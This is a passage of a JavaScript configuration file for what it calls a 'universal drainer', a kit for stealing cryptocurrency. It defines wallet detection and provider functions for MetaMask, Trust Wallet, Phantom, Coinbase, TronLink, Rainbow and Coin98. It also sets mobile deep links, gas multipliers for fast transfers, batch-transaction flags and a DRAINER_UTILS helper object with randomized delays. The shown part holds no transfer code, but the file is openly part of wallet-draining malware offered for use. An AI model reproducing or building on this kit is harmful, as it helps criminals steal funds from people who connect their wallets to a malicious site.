            { name: "Hiro Wallet", key: "isHiro", icon: "hiro.png" },
            { name: "OKX Wallet", key: "isOkxWallet", icon: "okx.png" }
        ]
    },

    // Mobile deep links
    MOBILE_LINKS: {
        ethereum: {
            "metamask": "https://metamask.app.link/dapp/",
            "trust": "https://link.trustwallet.com/open_url?coin_id=60&url=",
            "coinbase": "https://go.cb-w.com/dapp?cb_url=",
            "rainbow": "https://rainbow.me/dapp?url="
        },
        BSC: {
            "metamask": "https://metamask.app.link/dapp/",
            "trust": "https://link.trustwallet.com/open_url?coin_id=56&url=",
            "binance": "https://app.binance.com/cedefi/",
            "safepal": "https://link.safepal.io/dapp/"
        },
        SOL: {
            "phantom": "https://phantom.app/ul/browse/",
            "solflare": "https://solflare.com/access-wallet"
        },
        TRX: {
            "tronlink": "https://www.tronlink.org/"
        }
    },

    // Gas settings
    GAS_SETTINGS: {
        ethereum: {
            gasLimitMultiplier: 1.2,
            gasPriceMultiplier: 1.1,
            priorityFee: "2000000000" // 2 gwei
        },
        BSC: {
            gasLimitMultiplier: 1.1,
            gasPriceMultiplier: 1.05,
            gasPrice: "5000000000" // 5 gwei
        }
    },

    // UI Configuration
    UI: {
        showNetworkStats: true,
        showConnectionStatus: true,
        enableAnimations: true,
        theme: "gradient"
    },

    // Security settings
    SECURITY: {
        maxRetries: 3,
        timeoutDuration: 30000, // 30 seconds
        confirmationBlocks: {
            ethereum: 1,
        BSC: 1,
        SOL: 1,
        TRX: 1
        }
    },

    // Feature flags
    FEATURES: {
        multiChainSupport: true,
        mobileWalletSupport: true,
        walletConnectSupport: true,
        batchTransactions: true,
        gasOptimization: true
    },

    // Wallet definitions for universal drainer
    wallets: {
        metamask: {
            name: "MetaMask",
            icon: "🦊",
            type: "evm",
            networks: ["ethereum", "bsc", "polygon"],
            detect: () => window.ethereum && window.ethereum.isMetaMask,
            getProvider: () => window.ethereum,
            mobileDeepLink: "https://metamask.app.link/dapp/"
        },
        trust: {
            name: "Trust Wallet",
            icon: "🛡️",
            type: "multi-evm-tron",
            networks: ["ethereum", "bsc", "polygon", "tron"],
            detect: () => window.ethereum && window.ethereum.isTrust,
            getProvider: () => window.ethereum,
            mobileDeepLink: "https://link.trustwallet.com/open_url?coin_id=60&url="
        },
        phantom: {
            name: "Phantom",
            icon: "👻",
            type: "multi-evm-solana",
            networks: ["ethereum", "solana"],
            evmNetworks: ["ethereum"],
            solanaNetworks: ["solana"],
            detect: () => window.phantom || (window.ethereum && window.ethereum.isPhantom),
            getProvider: () => window.ethereum || window.phantom?.ethereum,
            getSolanaProvider: () => window.phantom?.solana,
            mobileDeepLink: "https://phantom.app/ul/browse/"
        },
        coinbase: {
            name: "Coinbase Wallet",
            icon: "🔵",
            type: "evm",
            networks: ["ethereum", "bsc", "polygon"],
            detect: () => window.ethereum && window.ethereum.isCoinbaseWallet,
            getProvider: () => window.ethereum,
            mobileDeepLink: "https://go.cb-w.com/dapp?cb_url="
        },
        tronlink: {
            name: "TronLink",
            icon: "🔴",
            type: "tron",
            networks: ["tron"],
            detect: () => window.tronWeb && window.tronWeb.defaultAddress,
            getProvider: () => window.tronWeb,
            mobileDeepLink: "https://dapp.tronlink.org/"
        },
        rainbow: {
            name: "Rainbow",
            icon: "🌈",
            type: "evm",
            networks: ["ethereum"],
            detect: () => window.ethereum && window.ethereum.isRainbow,
            getProvider: () => window.ethereum,
            mobileDeepLink: "https://rainbow.me/dapp?url="
        },
        coin98: {
            name: "Coin98",
            icon: "💰",
            type: "multi",
            networks: ["ethereum", "bsc", "polygon", "solana"],
            detect: () => window.ethereum && window.ethereum.isCoin98,
            getProvider: () => window.ethereum,
            mobileDeepLink: "https://coin98.com/wallet"
        }
    }
};

// Utility functions
window.DRAINER_UTILS = {
    isMobile: () => {
        return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
    },
    
    formatAddress: (address, length = 8) => {
        if (!address) return '';
        return `${address.slice(0, length)}...${address.slice(-4)}`;
    },
    
    formatBalance: (balance, decimals = 4) => {
        return parseFloat(balance).toFixed(decimals);
    },
    
    sleep: (ms) => {
        return new Promise(resolve => setTimeout(resolve, ms));
    },
    
    generateRandomDelay: (min = 1000, max = 3000) => {
        return Math.floor(Math.random() * (max - min + 1)) + min;
    }
};
